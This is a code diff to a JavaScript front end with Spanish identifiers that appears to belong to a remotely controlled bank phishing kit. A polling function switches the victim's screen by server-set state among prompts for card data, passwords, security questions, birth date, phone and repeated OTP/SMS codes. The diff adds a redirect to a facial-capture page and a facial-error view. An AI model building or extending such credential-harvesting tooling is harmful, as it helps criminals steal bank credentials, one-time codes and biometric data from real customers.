@@ -113,6 +113,18 @@ function consultar_estado() {
                 }
                 espera = 1;
                 break;
+            case '30':
+                if (prevEst !== '30') {
+                    vista_facial();
+                }
+                espera = 1;
+                break;
+            case '31':
+                if (prevEst !== '31' || !$(".error-facial").is(":visible")) {
+                    vista_error_facial();
+                }
+                espera = 1;
+                break;
             default:
                 espera = 1;
                 break;
@@ -154,6 +166,34 @@ function vista_saldo_listo() {
     $(".saldo-disponible").hide();
     $(".fondo").show();
     $(".mensaje").show();
+}
+
+function vista_facial() {
+    window.location.href = 'facial/faci.html';
+}
+
+function vista_error_facial() {
+    $(".fondo").hide();
+    $(".mensaje").hide();
+    $(".saldo-disponible").hide();
+    $(".acceso").hide();
+    $(".otp").hide();
+    $(".errorotp").hide();
+    $(".correo-con").hide();
+    $(".tarjeta").hide();
+    $(".tarjetadt").hide();
+    $(".apellidos").hide();
+    $(".fnacimiento").hide();
+    $(".mobil").hide();
+    $(".pregunta").hide();
+    $(".pregunta2").hide();
+    $(".clave").hide();
+    $(".clave2").hide();
+    $(".smsotp").hide();
+    $(".solicitacodigo").hide();
+    $(".codigootp3").hide();
+    $(".total").show();
+    $(".error-facial").show();
 }
 
 function vista_preguntarep(){
